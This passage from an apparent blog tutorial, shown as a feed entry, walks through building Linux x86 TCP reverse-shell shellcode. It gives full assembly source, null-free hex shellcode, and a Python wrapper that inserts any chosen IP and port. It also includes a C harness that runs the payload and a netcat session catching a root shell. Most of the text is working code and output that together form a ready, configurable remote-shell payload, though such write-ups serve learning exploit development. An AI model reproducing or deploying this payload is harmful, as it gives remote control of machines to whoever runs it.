&lt;p&gt;By this point, our asm script sets up a socket, attempts to connect to a remote host and sets up our pipes ready for our new target process, in this case, it’s our “/bin/sh” shell. This means the final system call required is our execve() call. Again, this implementation came out the same as our bind shell, so again, I won’t step through it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; syscall execve 11 (0xb)
xor eax, eax
push eax

; push //bin/sh and point at stack for 1st
push 0x68732f6e
push 0x69622f2f
mov ebx, esp

push eax
mov ecx, esp

push eax
mov edx, esp

xor eax, eax
mov al, 0xb
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our complete implementation can be seen below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global    _start
section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; syscall socket 359 (0x167)
    ; int socket(int domain, int type, int protocol); - returns fd
    mov ax, 0x167                     ; sys call number
    mov bl, 0x2                       ; AF_INET
    mov cl, 0x1                       ; SOCK_STREAM
    ; EDX should already be 0 from initial clear up top
    
    int 0x80                          ; exec syscall
    mov edi, eax                      ; save the fd

    ; syscall connect 362 (0x16a)
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    xor eax, eax
    mov ax, 0x16a
    mov ebx, edi                      ; our backed up fd from socket

    ; create our struct
    xor ecx, ecx
    push ecx
    mov byte [esp], 0x7f              ; now esp is: 0x0000007f
    mov byte [esp+3],0x01             ; now esp is 0x0100007f
    push ecx
    push word 0x2923                  ; port 9001
    push word 0x2                     ; AF_INET
    mov ecx, esp                      ; set the 2nd param to equal a pointer to our struct

    xor edx, edx
    mov dl, 16                        ; size of struct
    int 0x80

    ; syscall dup2 - 3 times 63 (0x3f)
    ; int dup2(int oldfd, int newfd);
    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    xor ecx, ecx
    int 0x80                          ; first call with 0

    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    mov cl, 0x1
    int 0x80                          ; second call with 1

    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    mov cl, 0x2
    int 0x80                          ; third call with 2

    ; syscall execve 11 (0xb)
    xor eax, eax
    push eax

    ; push //bin/sh and point at stack for 1st
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    push eax
    mov ecx, esp

    push eax
    mov edx, esp

    xor eax, eax
    mov al, 0xb
    int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now the reverse shell script is complete, we want to make sure we can assemble and link it without any errors. This is done with the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# ../misc/build.sh first_reverse_shell
Assembling first_reverse_shell.asm
Linking first_reverse_shell.o
Done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, I tested and confirmed that the reverse shell worked before moving on to the python wrapper that allows custom IP addresses and port values to be used within the reverse shell.&lt;/p&gt;

&lt;p&gt;We can then dump the hex from the assembled object, and check we don’t have any NULL bytes within the output. The contents of dump_hex.sh can be seen in the first post:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# ../misc/dump_hex.sh first_reverse_shell
&quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\xc6\\x04\\x24\\x7f\\xc6\\x44\\x24\\x03\\x01\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;wrapper-to-allow-custom-ip-address-and-port-number&quot;&gt;Wrapper to allow custom IP address and Port number:&lt;/h2&gt;
&lt;p&gt;Similar to the python wrapper used with our bind shell, this wrapper allows the user to specify their own port number. This number is then converted into hex values and placed within the correct position of our shellcode string. As well as the custom port number, I added functionality for custom IP addresses to be placed into the shellcode itself. I achieved this by taking the required instructions and their op codes from the ‘objdump -d’ output and created four separate chunks of these instructions.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fourth_ip_asm = &quot;\\xc6\\x04\\x24\\x[4]&quot;       # movb   $0x7f,(%esp)   (127)
third_ip_asm = &quot;\\xc6\\x44\\x24\\x01\\x[3]&quot;   # movb   $0x1,0x1(%esp) (1)
second_ip_asm = &quot;\\xc6\\x44\\x24\\x02\\x[2]&quot;  # movb   $0x1,0x2(%esp) (1)
first_ip_asm = &quot;\\xc6\\x44\\x24\\x03\\x[1]&quot;   # movb   $0x1,0x3(%esp) (1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, each string contains a tag with an integer in there, i.e [1], [2]. These tags are later replaced by the chunk of the target IP address in the correct order and in their hex value. I think we can already see where this is going, but let’s continue. Once each one of these chunks has been correctly filled, the final shellcode has the tags ‘[i4][i3][i2][i1]’ replaced with their required instructions and our final payload is complete. This is then output to the screen, ready to place in our C based injection script.&lt;/p&gt;

&lt;p&gt;The complete python wrapper with tags that are replaced by user input can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# cat wrapper.py 
import sys
import socket

shellcode = (
    &quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3&quot;
    &quot;\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01&quot;
    &quot;\\x89\\xfb\\x31\\xc9\\x51[i4][i3][i2][i1]\\x51\\x66\\x68[p2][p1]&quot;
    &quot;\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0&quot;
    &quot;\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89&quot;
    &quot;\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02&quot;
    &quot;\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f&quot;
    &quot;\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0&quot;
    &quot;\\x0b\\xcd\\x80&quot;
)

fourth_ip_asm = &quot;\\xc6\\x04\\x24\\x[4]&quot;         # movb   $0x7f,(%esp)   (127)
third_ip_asm = &quot;\\xc6\\x44\\x24\\x01\\x[3]&quot;     # movb   $0x1,0x1(%esp) (1)
second_ip_asm = &quot;\\xc6\\x44\\x24\\x02\\x[2]&quot;    # movb   $0x1,0x2(%esp) (1)
first_ip_asm = &quot;\\xc6\\x44\\x24\\x03\\x[1]&quot;     # movb   $0x1,0x3(%esp) (1)

if len(sys.argv) != 3:
    print 'Usage: ' + sys.argv[0] + ' &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;'
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]
print &quot;Chosen ip: %s&quot; % ip
print &quot;Chosen port: %s&quot; % port
ip_chunks = []

try:
    socket.inet_aton(ip)
    ip_chunks = ip.split(&quot;.&quot;)
    if len(ip_chunks) &amp;lt; 4:
        print &quot;Although IP appears legal, we are assuming 4 chunks (i.e 127.0.0.1)&quot;
        sys.exit()
except socket.error:
    print &quot;IP does not appear to be legal&quot;
    sys.exit()

int_port = int(port)
if int_port &amp;gt; 65535:
    print &quot;Port choice is greater than max value (65535)&quot;
    sys.exit()

ip_hex_1 = hex(int(ip_chunks[0]))
ip_hex_2 = hex(int(ip_chunks[1]))
ip_hex_3 = hex(int(ip_chunks[2]))
ip_hex_4 = hex(int(ip_chunks[3]))

ip_hex_1 = ip_hex_1.replace(&quot;0x&quot;, &quot;&quot;)
ip_hex_2 = ip_hex_2.replace(&quot;0x&quot;, &quot;&quot;)
ip_hex_3 = ip_hex_3.replace(&quot;0x&quot;, &quot;&quot;)
ip_hex_4 = ip_hex_4.replace(&quot;0x&quot;, &quot;&quot;)

first_ip_asm = first_ip_asm.replace(&quot;[1]&quot;, ip_hex_1)
second_ip_asm = second_ip_asm.replace(&quot;[2]&quot;, ip_hex_2)
third_ip_asm = third_ip_asm.replace(&quot;[3]&quot;, ip_hex_3)
fourth_ip_asm = fourth_ip_asm.replace(&quot;[4]&quot;, ip_hex_4)

print first_ip_asm
print second_ip_asm
print third_ip_asm
print fourth_ip_asm

htons_port_val = socket.htons(int_port)
hex_port_value = hex(htons_port_val)

cleaned_hex_port = hex_port_value.replace(&quot;0x&quot;, &quot;&quot;)
first_port_val = &quot;\\x&quot; + cleaned_hex_port[:2]
second_port_val = &quot;\\x&quot; + cleaned_hex_port[2:]

print &quot;1st port: %s&quot; % first_port_val
print &quot;2nd port: %s&quot; % second_port_val
print &quot;&quot;

print &quot;Ammending shellcode...&quot;
shellcode = shellcode.replace(&quot;[i4]&quot;, fourth_ip_asm)
shellcode = shellcode.replace(&quot;[i3]&quot;, third_ip_asm)
shellcode = shellcode.replace(&quot;[i2]&quot;, second_ip_asm)
shellcode = shellcode.replace(&quot;[i1]&quot;, first_ip_asm)

shellcode = shellcode.replace(&quot;[p2]&quot;, second_port_val)
shellcode = shellcode.replace(&quot;[p1]&quot;, first_port_val)

print &quot;Final Shellcode:&quot;
print shellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using our wrapper:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# python wrapper.py 127.0.0.1 9005
Chosen ip: 127.0.0.1
Chosen port: 9005
\xc6\x44\x24\x03\x7f
\xc6\x44\x24\x02\x0
\xc6\x44\x24\x01\x0
\xc6\x04\x24\x1
1st port: \x2d
2nd port: \x23

Ammending shellcode...
Final Shellcode:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xc6\x04\x24\x1\xc6\x44\x24\x01\x0\xc6\x44\x24\x02\x0\xc6\x44\x24\x03\x7f\x51\x66\x68\x23\x2d\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\x31\xc0\xb0\x0b\xcd\x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Slightly hinted at before, we can see the above out has two instances of NULL bytes due to the address containing two zeros (127.0.0.1). Due to the IP being split up into 4 chunks and then pushed onto the stack separately, these 0 values still exist. A check can be performed in the python to ignore these two instructions if the value required is a 0. They can safely be ignored as the target address is XOR’d before hand - giving us the 0 value within the target byte already. The following is the python wrapper after being adapted to handle any lone zero’s in the specified IP address:&lt;/p&gt;

&lt;p&gt;The second draft of our Python wrapper can be seen below, preventing NULL bytes from being used in our target IP address, the main change is the four ‘if statements’ that check the hex value of the IP chunk is not equal to “0”, if it is, the chunk of instructions is cleared.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
import socket

shellcode = (
    &quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3&quot;
    &quot;\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01&quot;
    &quot;\\x89\\xfb\\x31\\xc9\\x51[i4][i3][i2][i1]\\x51\\x66\\x68[p2][p1]&quot;
    &quot;\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0&quot;
    &quot;\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89&quot;
    &quot;\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02&quot;
    &quot;\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f&quot;
    &quot;\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0&quot;
    &quot;\\x0b\\xcd\\x80&quot;
)

fourth_ip_asm = &quot;\\xc6\\x04\\x24\\x[4]&quot;          # movb   $0x7f,(%esp)   (127)
third_ip_asm = &quot;\\xc6\\x44\\x24\\x01\\x[3]&quot;      # movb   $0x1,0x1(%esp) (1)
second_ip_asm = &quot;\\xc6\\x44\\x24\\x02\\x[2]&quot;     # movb   $0x1,0x2(%esp) (1)
first_ip_asm = &quot;\\xc6\\x44\\x24\\x03\\x[1]&quot;      # movb   $0x1,0x3(%esp) (1)

if len(sys.argv) != 3:
    print 'Usage: ' + sys.argv[0] + ' &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;'
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]
print &quot;Chosen ip: %s&quot; % ip
print &quot;Chosen port: %s&quot; % port
ip_chunks = []

try:
    socket.inet_aton(ip)
    ip_chunks = ip.split(&quot;.&quot;)
    if len(ip_chunks) &amp;lt; 4:
        print &quot;Although IP appears legal, we are assuming 4 chunks (i.e 127.0.0.1)&quot;
        sys.exit()
except socket.error:
    print &quot;IP does not appear to be legal&quot;
    sys.exit()

int_port = int(port)
if int_port &amp;gt; 65535:
    print &quot;Port choice is greater than max value (65535)&quot;
    sys.exit()

ip_hex_1 = hex(int(ip_chunks[0]))
ip_hex_2 = hex(int(ip_chunks[1]))
ip_hex_3 = hex(int(ip_chunks[2]))
ip_hex_4 = hex(int(ip_chunks[3]))

ip_hex_1 = ip_hex_1.replace(&quot;0x&quot;, &quot;&quot;)
ip_hex_2 = ip_hex_2.replace(&quot;0x&quot;, &quot;&quot;)
ip_hex_3 = ip_hex_3.replace(&quot;0x&quot;, &quot;&quot;)
ip_hex_4 = ip_hex_4.replace(&quot;0x&quot;, &quot;&quot;)

first_ip_asm = first_ip_asm.replace(&quot;[1]&quot;, ip_hex_1)
second_ip_asm = second_ip_asm.replace(&quot;[2]&quot;, ip_hex_2)
third_ip_asm = third_ip_asm.replace(&quot;[3]&quot;, ip_hex_3)
fourth_ip_asm = fourth_ip_asm.replace(&quot;[4]&quot;, ip_hex_4)

# if any of the address chunks are equal to 0, clear the value so it is ignored.
if ip_hex_1 == &quot;0&quot;:
    first_ip_asm = &quot;&quot;
    print &quot;1st IP chunk contained a NULL byte, ignoring&quot;
else:
    print &quot;1st IP chunk asm: %s&quot; % first_ip_asm

if ip_hex_2 == &quot;0&quot;:
    second_ip_asm = &quot;&quot;
    print &quot;2nd IP chunk contained a NULL byte, ignoring&quot;
else:
    print &quot;2nd IP chunk asm: %s&quot; % second_ip_asm

if ip_hex_3 == &quot;0&quot;:
    third_ip_asm = &quot;&quot;
    print &quot;3rd IP chunk contained a NULL byte, ignoring&quot;
else:
    print &quot;3rd IP chunk asm: %s&quot; % third_ip_asm

if ip_hex_4 == &quot;0&quot;:
    fourth_ip_asm = &quot;&quot;
    print &quot;4th IP chunk contained a NULL byte, ignoring&quot;
else:
    print &quot;4th IP chunk asm: %s&quot; % fourth_ip_asm

htons_port_val = socket.htons(int_port)
hex_port_value = hex(htons_port_val)

cleaned_hex_port = hex_port_value.replace(&quot;0x&quot;, &quot;&quot;)
first_port_val = &quot;\\x&quot; + cleaned_hex_port[:2]
second_port_val = &quot;\\x&quot; + cleaned_hex_port[2:]

print &quot;1st port: %s&quot; % first_port_val
print &quot;2nd port: %s&quot; % second_port_val
print &quot;&quot;

print &quot;Ammending shellcode...&quot;
shellcode = shellcode.replace(&quot;[i4]&quot;, fourth_ip_asm)
shellcode = shellcode.replace(&quot;[i3]&quot;, third_ip_asm)
shellcode = shellcode.replace(&quot;[i2]&quot;, second_ip_asm)
shellcode = shellcode.replace(&quot;[i1]&quot;, first_ip_asm)

shellcode = shellcode.replace(&quot;[p2]&quot;, second_port_val)
shellcode = shellcode.replace(&quot;[p1]&quot;, first_port_val)

print &quot;Final Shellcode:&quot;
print shellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running our Python wrapper once again produces NULL byte free shellcode that can be placed directly into our C script, allowing us to compile and inject the new payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# cat shell.c
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xc6\x04\x24\x1\xc6\x44\x24\x03\x7f\x51\x66\x68\x23\x2d\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\x31\xc0\xb0\x0b\xcd\x80&quot;;

int main(void)  {
    printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can finally compile our C program with the required arguments:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# gcc -fno-stack-protector -z execstack shell.c -o shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We are now ready to try out our reverse shell. First we set up a listener on the specified port:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# nc -nlvp 9005
listening on [any] 9005 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We then execute our newly compiled shell:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# ./shell 
Shellcode Length:  113
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking back at our listener, we notice we have the successfully caught our reverse shell and have dropped into an interactive “/bin/sh” process:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# nc -nlvp 9005
listening on [any] 9005 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40884
id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Crawl3r</name></author><summary type="html">Introduction After writing bind shell, I wanted to learnt how to create a TCP reverse shell using x86. I noticed that a high percentage of code could be taken directly from the TCP bind shell. However I chose to implement this from scratch without copy and pasting in order to confirm my newly learnt instructions and confirm I remembered the previous task of creating a bind shell and the steps taken to complete it. Brief Thoughts During this task I performed similar steps to the bind shell, so to prevent a high amount of repetition within this post I will walk through the code once again however I will only explain specific sections of code that were not discussed during the completion of the TCP bind shell, making sure to cover any new C, system calls, wrapper changes and x86. Overall, I found implementing the reverse shell to be easier than the bind shell - but this may be because I had already written my first file in x86 so now this felt a little easier to work through. I had a little trouble making sure the python wrapper stomped out any NULL bytes, however that will be discussed later on in the post. Initial Planning Similar to the bind shell, my first steps are to gather the information required to create my reverse shell - making sure I have all the required system call information and any additional documentation required to duplicate a C based reverse shell. The following C code presents the TCP reverse shell solution that I used as my reference: #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; int main(int argc, char *argv[]) { struct sockaddr_in sa; int s; // creating our struct for use with socket sys call sa.sin_family = AF_INET; sa.sin_addr.s_addr = inet_addr(“127.0.0.1”) sa.sin_port = htons(9001); // first sys call s = socket(AF_INET, SOCK_STREAM, 0); // second sys call connect(s, (struct sockaddr *)&amp;amp;sa, sizeof(sa)); // third sys call dup2(s, 0); dup2(s, 1); dup2(s, 2); // fourth &amp;amp; final sys call execve(&quot;/bin/sh&quot;, 0, 0); return 0; } Compared to the bind shell, the only new system call we can see here is the connect() function. Before we start, let’s make sure we have all the required information using the same approach as last time: root@kali:~/Documents/revshell# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep connect #define __NR_connect 362 root@kali:~/Documents/revshell# man 2 connect &amp;lt;snipped&amp;gt; SYNOPSIS #include &amp;lt;sys/types.h&amp;gt; /* See NOTES */ #include &amp;lt;sys/socket.h&amp;gt; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); &amp;lt;snipped&amp;gt; RETURN VALUE If the connection or binding succeeds, zero is returned. On error, -1 is returned, and errno is set appropriately. We can now create our table of system calls required for the reverse shell: System Call C Definition Return Value Syscall Number socket int socket(int domain, int type, int protocol); File descriptor for the new socket. 359 (0x167) connect int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); n/a 362 (0x16a) dup2 int dup2(int oldfd, int newfd); n/a 63 (0x3f) execve int execve(const char *pathname, char *const argv[], char *const envp[]); n/a 11 (0xb) Crafting our Reverse Shellcode Similar to our bind shell, we first want to create the skeleton of our script. Making sure we have our entry point and clean registers: global _start section .text _start: xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx The first system call we want to implement into our reverse shell script is the socket(). This was used within our TCP bind shell, and for that reason i won’t be explaining it as much as I did there. The implementation was the same and approach taken reflected that of my second bind shell attempt, preventing any NULL bytes from being in the final payload: ; syscall socket 359 (0x167) ; int socket(int domain, int type, int protocol); - returns fd mov ax, 0x167 ; sys call number mov bl, 0x2 ; AF_INET mov cl, 0x1 ; SOCK_STREAM ; EDX should already be 0 from initial clear up top int 0x80 ; exec syscall mov edi, eax ; save the fd The second system call required is new to us, and required a bit of work to get up and running correctly. This call is the connect() system call. Looking at our table above, we can see that we need the following: our file descriptor that was returned from socket() a pointer to a sockaddr struct the size of this sockaddr struct in memory As previously researched, the sockaddr struct contains the following data (taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf): struct sockaddr_in { short sin_family; // e.g. AF_INET ‏)3490(unsigned short sin_port; // e.g. htons struct in_addr sin_addr; // see struct in_addr, below char sin_zero[8]; // zero this if you want to }; So now we have our struct definition, we want to include the following information: AF_INET (2) The port number (I used 9001 - 0x2329) The address (127.0.0.1 as we are listening locally) 0 Before walking through our implementation, we need to address the fact that the target IP address (in this case) will contain two separate 0’s, which will result in NULL bytes existing in our payload. This can be addressed in various ways, for example, h0mbre_ pushed a value into the target address and subtracted another value from it - resulting in the target value without hardcoding any 0 values. For my approach, I zeroed the register and then moved single bytes into the target areas of the register using the ‘mov byte’ instruction. I found this was also used in a NULL byte free reverse shell online at https://packetstormsecurity.com/files/154374/Linux-x86-TCP-Reverse-Shell-127.0.0.1-Nullbyte-Free-Shellcode.html. The following snippet shows my implementation and how I created my data struct, along with my target IP address (127.0.0.1) without any NULL bytes existing. ; create our struct xor ecx, ecx push ecx mov byte [esp], 0x7f ; now esp is: 0x0000007f mov byte [esp+3],0x01 ; now esp is 0x0100007f push ecx push word 0x2923 ; port 9001 push word 0x2 ; AF_INET mov ecx, esp ; set the 2nd param to equal a pointer to our struct As we can see above, ECX is XOR’d and pushed onto the stack (resulting in 0x00000000), we then move the value 127 (0x7f) into the lowest part of the address, followed by another move byte instruction which places the value 1 (0x1) into the highest part of the register, finally resulting in 0x0100007f - this now means the current value on the top of our stack is our local IP address, 127.0.0.1. We then complete our data struct by pushing our port number and value for AF_INET onto the stack. Now we have our completed data struct in memory, we can implement our connect system call with each parameter correctly set ready for execution. This can seen in the following snippet: ; syscall connect 362 (0x16a) ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); xor eax, eax mov ax, 0x16a mov ebx, edi ; our backed up fd from socket() ; create our struct xor ecx, ecx push ecx mov byte [esp], 0x7f ; now esp is: 0x0000007f mov byte [esp+3],0x01 ; now esp is 0x0100007f push ecx push word 0x2923 ; port 9001 push word 0x2 ; AF_INET mov ecx, esp ; set the 2nd param to equal a pointer to our struct xor edx, edx mov dl, 16 ; size of struct int 0x80 To quickly cover the above snippet, we start off by XOR-ing our EAX register before placing the syscall value 362 (0x16a) into the lower half of the register. Remember, we use AX instead of EAX to remove any NULL bytes in the final payload. We place the value returned by our socket() system call in our 1st parameter (EBX) before crafting our sockaddr struct. Once created and placed on the stack, as described before, we move the current value of our ESP register (pointer to the top of the stack) into our second parameter (ECX). This now satisfies the pointer requirement, described in our initial analysis of the connect system call. Finally, we xor our 3rd parameter register (EDX) and move the value 16 into the lower half of the register, stating the size of the struct. The system call is now ready to execute with the ‘int 0x80’ instruction. We now need to call dup2() three times to set up our pipes for our final shell. Originally, in the implementation of the bind shell, I implemented three separate chunks of instructions to perform the system call with the correct parameter values. In my second draft I changed this to use a loop, decrementing the counter each time before breaking out of the loop. This time around I returned to the three separate chunks of instructions. The main reason was, I forgot how to implement a loop and I didn’t want to look back at my previous asm file for help. So I stuck with the three chunks: ; syscall dup2 - 3 times 63 (0x3f) ; int dup2(int oldfd, int newfd); xor eax, eax mov al, 0x3f mov ebx, edi xor ecx, ecx int 0x80 ; first call with 0 xor eax, eax mov al, 0x3f mov ebx, edi mov cl, 0x1 int 0x80 ; second call with 1 xor eax, eax mov al, 0x3f mov ebx, edi mov cl, 0x2 int 0x80 ; third call with 2 I won’t explain this code again, as it is exactly the same as the bind shell. If you are unsure of the implementation above, please check that post. By this point, our asm script sets up a socket, attempts to connect to a remote host and sets up our pipes ready for our new target process, in this case, it’s our “/bin/sh” shell. This means the final system call required is our execve() call. Again, this implementation came out the same as our bind shell, so again, I won’t step through it. ; syscall execve 11 (0xb) xor eax, eax push eax ; push //bin/sh and point at stack for 1st push 0x68732f6e push 0x69622f2f mov ebx, esp push eax mov ecx, esp push eax mov edx, esp xor eax, eax mov al, 0xb int 0x80 Our complete implementation can be seen below: global _start section .text _start: xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx ; syscall socket 359 (0x167) ; int socket(int domain, int type, int protocol); - returns fd mov ax, 0x167 ; sys call number mov bl, 0x2 ; AF_INET mov cl, 0x1 ; SOCK_STREAM ; EDX should already be 0 from initial clear up top int 0x80 ; exec syscall mov edi, eax ; save the fd ; syscall connect 362 (0x16a) ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); xor eax, eax mov ax, 0x16a mov ebx, edi ; our backed up fd from socket ; create our struct xor ecx, ecx push ecx mov byte [esp], 0x7f ; now esp is: 0x0000007f mov byte [esp+3],0x01 ; now esp is 0x0100007f push ecx push word 0x2923 ; port 9001 push word 0x2 ; AF_INET mov ecx, esp ; set the 2nd param to equal a pointer to our struct xor edx, edx mov dl, 16 ; size of struct int 0x80 ; syscall dup2 - 3 times 63 